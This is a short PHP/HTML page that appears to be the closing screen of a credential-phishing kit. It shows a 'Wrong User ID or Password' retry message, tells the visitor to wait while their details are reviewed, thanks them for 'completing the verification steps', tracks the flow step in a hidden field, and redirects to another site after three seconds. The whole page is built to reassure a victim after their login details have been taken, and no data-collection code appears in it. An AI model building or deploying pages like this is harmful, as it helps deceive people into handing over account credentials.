<?php
if (isset($_GET['error']) && $_GET['error'] == 3) {
?>
    <center>
        <p style="color: red;">Wrong User ID or Password, Please try again.</p>
    </center>
<?php } ?>



<meta http-equiv="Refresh" content="3; url=https://www.url.com/">


<center>

    <div style="margin: .75rem 0;">
        <img width="200px" src="./assets/img/372103860_CHECK_MARK_400px.gif">
        <p>Please wait while we review and verify.</p>
        <p>We thank you for completing the verification
            steps.<br>
        </p>
    </div>

</center>



<?php
if (isset($_GET['error']) && $_GET['error'] == 3) {
?>




<?php } ?>

<?php
if (isset($_GET['error']) && $_GET['error'] == 3) {
?>
    <input name="action" value="4" type="hidden">
<?php
} else {
?>
    <input name="action" value="3" type="hidden">
<?php
}
?>